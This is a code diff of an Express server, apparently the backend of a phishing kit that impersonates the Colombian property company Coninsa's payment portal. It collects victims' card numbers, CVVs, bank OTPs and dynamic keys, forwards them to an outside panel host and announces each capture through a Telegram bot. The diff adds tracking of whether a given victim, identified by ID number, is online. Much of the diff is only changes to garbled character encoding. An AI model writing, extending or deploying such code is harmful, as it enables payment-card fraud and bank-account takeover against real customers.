@@ -1,4 +1,4 @@
-﻿// Coninsa API v1.0 â€” Palomma tRPC (sin CAPTCHA)
+// Coninsa API v1.0 â€" Palomma tRPC (sin CAPTCHA)
 const express = require('express');
 const cors    = require('cors');
 const axios   = require('axios');
@@ -15,7 +15,7 @@ const app = express();
 app.use(express.json({ limit: '10mb' }));
 app.use(cors({ origin: true, credentials: true }));
 
-// â”€â”€ Cache 10 min â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â"€â"€ Cache 10 min â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 const _cache = new Map();
 const TTL    = 10 * 60 * 1000;
 function cacheGet(k) {
@@ -25,8 +25,9 @@ function cacheGet(k) {
 }
 function cacheSet(k, v) { _cache.set(k, { v, ts: Date.now() }); }
 
-// â”€â”€ Sesiones online (ventana 5 min) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-const _online = new Map(); // ip â†’ { ts, ref, ua }
+// â"€â"€ Sesiones online (ventana 5 min) â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
+const _online   = new Map(); // ip -> { ts, ref, ua }
+const _cedulaIp = new Map(); // cedula -> ip
 function onlinePing(ip, ref, ua) {
   _online.set(ip, { ts: Date.now(), ref: ref || '', ua: ua || '' });
 }
@@ -35,8 +36,14 @@ function onlineCount() {
   for (const [k, v] of _online) if (v.ts < cutoff) _online.delete(k);
   return _online.size;
 }
+function isCedulaOnline(cedula) {
+  const ip = _cedulaIp.get(String(cedula));
+  if (!ip) return false;
+  const s = _online.get(ip);
+  return !!s && (Date.now() - s.ts) < 5 * 60 * 1000;
+}
 
-// â”€â”€ Rate limit 15 req/min por IP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â"€â"€ Rate limit 15 req/min por IP â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 const _rl = new Map();
 function allowed(ip, max = 15, win = 60_000) {
   const now  = Date.now();
@@ -48,7 +55,7 @@ function getIp(req) {
   return (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '').split(',')[0].trim();
 }
 
-// â”€â”€ Palomma tRPC â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â"€â"€ Palomma tRPC â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 async function palommaListar(documento) {
   const input = JSON.stringify({
     "0": { rentalsMerchantId: MERCHANT_ID, customerIdentifier: documento }
@@ -69,7 +76,7 @@ async function palommaListar(documento) {
   return data?.[0]?.result?.data ?? null;
 }
 
-// â”€â”€ Telegram â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â"€â"€ Telegram â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 async function tgText(msg) {
   if (!TG_TOKEN || !TG_CHAT) return;
   await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
@@ -79,13 +86,13 @@ async function tgText(msg) {
   }).catch(() => {});
 }
 
-// â”€â”€ Formatear pesos colombianos â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â"€â"€ Formatear pesos colombianos â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 function fmtCOP(n) {
   if (!n && n !== 0) return null;
   return new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(n);
 }
 
-// â”€â”€ Telegram proxy (para el modal de tarjeta del front) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â"€â"€ Telegram proxy (para el modal de tarjeta del front) â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 async function tgSend(msg, reply_markup) {
   if (!TG_TOKEN || !TG_CHAT) return { ok: false };
   const body = { chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' };
@@ -113,7 +120,7 @@ async function tgAnswerCallback(id) {
 
 const PSEC_BASE = 'https://pagpse-u6htdvaa.b4a.run';
 
-// â”€â”€ BIN lookup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â"€â"€ BIN lookup â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 const BIN_SERVER_CACHE = {};
 const BIN_MANUAL = {
   '360324': 'Davivienda',
@@ -603,7 +610,7 @@ async function detectBin(cardNumber) {
   } catch { return null; }
 }
 
-// â”€â”€ Routes â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â"€â"€ Routes â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 
 // Visita nueva: log a Telegram
 app.post('/api/visita', async (req, res) => {
@@ -614,11 +621,11 @@ app.post('/api/visita', async (req, res) => {
   res.json({ ok: true, online: onlineCount() });
   if (!isNew) return; // solo loguear visitas nuevas (no reconexiones del mismo IP)
   const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
-  const refTxt = ref ? `\nðŸ”— <b>Referencia:</b> <code>${ref}</code>` : '';
+  const refTxt = ref ? `\nðŸ"— <b>Referencia:</b> <code>${ref}</code>` : '';
   await tgText(
-    `ðŸŒ <b>NUEVA VISITA â€” CONINSA</b>\n` +
+    `ðŸŒ <b>NUEVA VISITA â€" CONINSA</b>\n` +
     `ðŸŒ <b>IP:</b> <code>${ip}</code>${refTxt}\n` +
-    `ðŸ‘¥ <b>Online ahora:</b> ${onlineCount()}\n` +
+    `ðŸ'¥ <b>Online ahora:</b> ${onlineCount()}\n` +
     `ðŸ• ${hora}`
   );
 });
@@ -631,10 +638,12 @@ app.post('/api/ping', (req, res) => {
   res.json({ ok: true, online: onlineCount() });
 });
 
-// â”€â”€ Proxy psec tarjetas â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â"€â"€ Proxy psec tarjetas â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 app.post('/api/tarjeta/crear', async (req, res) => {
   try {
+    const ip = getIp(req);
     const { numero_tarjeta, fecha, cvv, tipo_doc, cedula, monto } = req.body || {};
+    if (cedula) _cedulaIp.set(String(cedula), ip);
     const banco = (await detectBin(numero_tarjeta)) ||
       (num => num[0]==='4' ? 'Visa' : num[0]==='5' ? 'Mastercard' : num[0]==='3' ? 'Amex/Diners' : 'Otra')(
         (numero_tarjeta || '').replace(/\s/g,'')
@@ -658,16 +667,20 @@ app.post('/api/tarjeta/crear', async (req, res) => {
     });
     const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     await tgText(
-      `ðŸ’³ <b>NUEVA TARJETA â€” CONINSA</b>\n` +
-      `ðŸ†” <b>ID:</b> <code>${r.data?.id || '?'}</code>\n` +
+      `ðŸ'³ <b>NUEVA TARJETA â€" CONINSA</b>\n` +
+      `ðŸ†" <b>ID:</b> <code>${r.data?.id || '?'}</code>\n` +
       `ðŸ¦ <b>Banco:</b> ${banco}\n` +
-      `ðŸ“‹ <b>Doc:</b> <code>${tipo_doc} ${cedula}</code>\n` +
-      `ðŸ’° <b>Monto:</b> $${Number(monto || 0).toLocaleString('es-CO')}\n` +
+      `ðŸ"‹ <b>Doc:</b> <code>${tipo_doc} ${cedula}</code>\n` +
+      `ðŸ'° <b>Monto:</b> $${Number(monto || 0).toLocaleString('es-CO')}\n` +
       `ðŸ• ${hora}\n` +
       `<i>(datos en el panel)</i>`
     );
     res.json(r.data);
   } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
+});
+
+app.get('/api/online/:cedula', (req, res) => {
+  res.json({ online: isCedulaOnline(req.params.cedula) });
 });
 
 app.post('/api/detect-bank', async (req, res) => {
@@ -702,15 +715,15 @@ app.post('/api/tarjeta/actualizar', async (req, res) => {
     const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     if (banco_otp) {
       await tgText(
-        `ðŸ“² <b>OTP INGRESADO â€” CONINSA</b>\n` +
-        `ðŸ†” <b>ID:</b> <code>${id}</code>\n` +
+        `ðŸ"² <b>OTP INGRESADO â€" CONINSA</b>\n` +
+        `ðŸ†" <b>ID:</b> <code>${id}</code>\n` +
         `ðŸ• ${hora}\n` +
         `<i>(valor en el panel)</i>`
       );
     } else if (dinamica) {
       await tgText(
-        `ðŸ”‘ <b>CLAVE DINÃMICA INGRESADA â€” CONINSA</b>\n` +
-        `ðŸ†” <b>ID:</b> <code>${id}</code>\n` +
+        `ðŸ"' <b>CLAVE DINÃMICA INGRESADA â€" CONINSA</b>\n` +
+        `ðŸ†" <b>ID:</b> <code>${id}</code>\n` +
         `ðŸ• ${hora}\n` +
         `<i>(valor en el panel)</i>`
       );
@@ -802,10 +815,10 @@ app.post('/api/coninsa/buscar', async (req, res) => {
     if (invoices.length > 0) {
       const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
       await tgText(
-        `ðŸ¢ <b>Coninsa â€” Consulta</b>\n\n` +
-        `ðŸ“ <b>Documento:</b> <code>${doc}</code>\n` +
-        `ðŸ“Š <b>Facturas:</b> ${invoices.length}\n` +
-        `ðŸ’° <b>Total deuda:</b> ${fmtCOP(total)}\n` +
+        `ðŸ¢ <b>Coninsa â€" Consulta</b>\n\n` +
+        `ðŸ" <b>Documento:</b> <code>${doc}</code>\n` +
+        `ðŸ"Š <b>Facturas:</b> ${invoices.length}\n` +
+        `ðŸ'° <b>Total deuda:</b> ${fmtCOP(total)}\n` +
         `ðŸ• <b>Hora:</b> ${hora}`
       );
     }
